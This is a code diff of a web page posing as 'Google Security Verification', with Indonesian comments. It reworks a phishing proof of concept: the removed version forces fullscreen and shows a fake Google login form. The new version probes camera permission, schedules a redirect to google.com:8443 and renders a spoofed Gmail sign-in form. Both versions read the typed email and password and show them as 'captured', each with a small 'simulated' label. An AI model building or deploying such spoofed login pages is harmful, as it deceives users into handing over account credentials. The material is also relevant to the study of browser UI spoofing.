@@ -6,20 +6,21 @@
 <title>Google Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; text-align: center; padding: 16px; }
   .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
   h2 { color: #4285f4; margin-bottom: 10px; }
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
   button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
   button:hover { background: #1557b0; }
-  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
+  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; word-break: break-word; }
+  .cam-box { margin: 14px 0; padding: 10px; background: #f8f9fa; border: 1px solid #e0e0e0; border-radius: 8px; font-size: 12px; color: #333; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443).</p>
+  <h2>Google Security Verification</h2>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda dan menguji alur izin kamera serta redirect ke port 8443.</p>
   <button id="startBtn">Verify Account</button>
   <div id="status">[*] Ready...</div>
 </div>
@@ -32,80 +33,86 @@
   var statusEl = document.getElementById('status');
 
   function log(msg) {
-    statusEl.textContent = msg;
-    console.log("[Fullscreen 8443] " + msg);
+    if (statusEl) {
+      statusEl.textContent = msg;
+    }
+    console.log("[Delay + Cam Probe] " + msg);
   }
 
-  // ============================================
-  // 1. TRIGGER (KLIK)
-  // ============================================
-  btn.addEventListener('click', async function() {
-    log("[*] Memulai fullscreen UI spoofing + direct 8443...");
-
-    // ============================================
-    // 2. REQUEST FULLSCREEN
-    // ============================================
-    try {
-      var elem = document.documentElement;
-      if (elem.requestFullscreen) {
-        await elem.requestFullscreen();
-      } else if (elem.webkitRequestFullscreen) {
-        await elem.webkitRequestFullscreen();
-      } else if (elem.mozRequestFullScreen) {
-        await elem.mozRequestFullScreen();
-      }
-      log("[+] Fullscreen granted!");
-    } catch (e) {
-      log("[-] Fullscreen denied: " + e.message);
+  function requestCameraPermission(onResult) {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      onResult("getUserMedia not supported");
+      return;
     }
 
-    // ============================================
-    // 3. UI SPOOFING (FULLSCREEN FORM LOGIN PALSU)
-    // ============================================
-    document.body.innerHTML = `
-      <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;z-index:9999;">
-        <div style="font-size:48px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
-        <h1 style="color:#333;font-size:28px;margin-bottom:10px;">Google Security Verification</h1>
-        <p style="color:#666;font-size:16px;margin-bottom:30px;">Please enter your credentials to continue.</p>
-        <input type="email" id="fullEmail" placeholder="Email or phone" style="width:80%;max-width:400px;padding:15px;margin-bottom:15px;border:1px solid #ddd;border-radius:8px;font-size:16px;" />
-        <input type="password" id="fullPass" placeholder="Password" style="width:80%;max-width:400px;padding:15px;margin-bottom:15px;border:1px solid #ddd;border-radius:8px;font-size:16px;" />
-        <button id="fullLogin" style="width:80%;max-width:400px;padding:15px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;">Next</button>
-        <div style="margin-top:20px;font-size:12px;color:#f00;">This is a simulated phishing test. Do not enter real credentials.</div>
-      </div>
-    `;
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(function (stream) {
+        stream.getTracks().forEach(function (track) { track.stop(); });
+        onResult("Camera permission: granted");
+      })
+      .catch(function (err) {
+        onResult("Camera permission: " + err.name + " (" + err.message + ")");
+      });
+  }
 
-    // ============================================
-    // 4. TANGKAP INPUT
-    // ============================================
-    document.getElementById('fullLogin').addEventListener('click', function() {
-      var email = document.getElementById('fullEmail').value;
-      var password = document.getElementById('fullPass').value;
-      
-      if (!email || !password) {
-        alert("Email dan password harus diisi!");
-        return;
+  btn.addEventListener('click', function () {
+    log("[*] Memulai kamera & redirect delay ke google:8443...");
+
+    var camStatusText = "Requesting camera permission...";
+
+    requestCameraPermission(function (resText) {
+      camStatusText = resText;
+      var liveCamEl = document.getElementById('camStatusLabel');
+      if (liveCamEl) {
+        liveCamEl.textContent = camStatusText;
       }
+      console.log("[Cam Result] " + camStatusText);
+    });
 
-      // Tampilkan data yang ditangkap
+    setTimeout(function () {
+      try {
+        window.location.href = "https://www.google.com:8443";
+      } catch (e) {
+        log("[-] Redirect error: " + e.message);
+      }
+    }, 300);
+
+    setTimeout(function () {
       document.body.innerHTML = `
-        <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;color:#0f0;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:monospace;z-index:9999;">
-          <h1 style="color:#f00;font-size:28px;">Credentials Captured!</h1>
-          <p style="font-size:18px;"><strong>Email:</strong> ${email}</p>
-          <p style="font-size:18px;"><strong>Password:</strong> ${password}</p>
-          <p style="color:#666;font-size:14px;margin-top:20px;">Redirecting to Google...</p>
+        <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
+          <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
+          <h2 style="color:#333;margin-bottom:10px;">Sign in</h2>
+          <p style="color:#666;font-size:14px;margin-bottom:14px;">to continue to Gmail</p>
+          <div id="camStatusLabel" class="cam-box">${camStatusText}</div>
+          <input type="email" id="spoofEmail" placeholder="Email or phone" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
+          <input type="password" id="spoofPass" placeholder="Password" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
+          <button id="spoofLogin" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;">Next</button>
+          <div style="margin-top:15px;font-size:11px;color:#888;">Simulated verification &amp; camera prompt timing test.</div>
         </div>
       `;
 
-      // Redirect ke Google:8443 setelah 2 detik
-      setTimeout(function() {
-        window.location.href = "https://www.google.com:8443";
-      }, 2000);
-    });
+      var loginBtn = document.getElementById('spoofLogin');
+      if (loginBtn) {
+        loginBtn.addEventListener('click', function () {
+          var email = document.getElementById('spoofEmail').value;
+          var password = document.getElementById('spoofPass').value;
 
-    log("[+] Fullscreen UI spoofing active!");
+          document.body.innerHTML = `
+            <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:monospace;">
+              <h2 style="color:#d93025;">Simulated Capture</h2>
+              <p><strong>Email:</strong> ${email}</p>
+              <p><strong>Password:</strong> ${password}</p>
+              <p style="color:#666;font-size:12px;margin-top:20px;">Redirecting to Google...</p>
+            </div>
+          `;
 
+          setTimeout(function () {
+            window.location.href = 'https://www.google.com';
+          }, 2000);
+        });
+      }
+    }, 1000);
   }, { once: true });
-
 })();
 </script>
 
